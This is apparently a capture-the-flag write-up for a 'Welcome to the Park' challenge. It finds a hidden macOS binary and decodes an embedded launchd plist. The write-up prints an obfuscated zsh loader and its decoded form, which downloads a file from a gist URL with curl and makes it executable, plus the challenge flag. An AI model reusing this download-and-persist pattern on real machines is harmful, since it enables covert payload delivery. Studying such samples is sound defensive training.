# Welcome to the Park (misc, 453 solves, 50 points)

## Introduction

<p align="left">
  <img height=400 img src=./readme_assets/park-challenge.PNG/>
</p>

## Solution

While looking through the files I found a bash doc that says `# ls -a is your friend`.

There is a hidden folder `.hidden`.

Inside is a file with no extension. Using `file` we get `welcomeToThePark: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>`.

Using `strings` on the file I found a section that needed to be decoded and de-obfuscated.

```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
```
Here is the section needing de-obfuscating.

```
A0b='tmp="$(m'
A0bERheZ='ktemp /tmp/XX'
A0bERheZX='XXXXXX)"'
A0bER='; curl --'
A0bE='retry 5 -f '
A0bERh='"https://'
A0bERheZXDRi='gist.githu'
xbER='b.com/s'
juuQ='tuartjas'
juuQQ7l7X5='h/a7d18'
juuQQ7l7X5yX='7c44f4327'
juuQQ7l7X5y='739b752d037be45f01'
juuQQ7='" -o "${tmp}"; i'
juuQQ7l7='f [[ -s "${tmp}'
juuQQ7l='" ]];'
juQQ7l7X5y=' then chm'
juQQ7l='od 777 "${tmp}"; '
zRO3OUtcXt='"${tmp}"'
zRO3OUt='; fi; rm'
zRO3OUtcXteB=' "${tmp}"'
```

The de-obfuscated zhs code is:

```
tmp="$(mktemp /tmp/XXXXXX)"
curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}"; if [[ -s "${tmp}" ]]; then chmod 777 "${tmp}"; fi; rm "${tmp}"
```
Just going to the url address takes you to a git repo with a jpg.

<p align="left">
  <img height=500 img src=./readme_assets/JohnHammond.jpg/>
</p>

## Flag

**`flag{680b736565c76941a364775f06383466}`**

## Tools

- `file`
- `strings`
